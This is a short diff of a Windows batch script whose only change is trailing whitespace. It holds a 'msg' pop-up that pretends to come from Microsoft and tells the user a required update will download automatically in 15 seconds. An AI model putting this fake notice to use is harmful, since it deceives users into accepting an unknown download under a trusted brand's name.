@@ -1,7 +1,7 @@
 @echo off
 
 ::Prompt user for Windows update.
-msg %username% /W "A new Windows update is availible. It is required to download it. It only takes a couple of minutes, 
+msg %username% /W "A new Windows update is availible. It is required to download it. It only takes a couple of minutes,
 but after this your computer is safe. It will fix all known problems, vulnerabilities etc. Thanks, Microsoft Windows.
 The download will automatically start after 15 seconds."
 
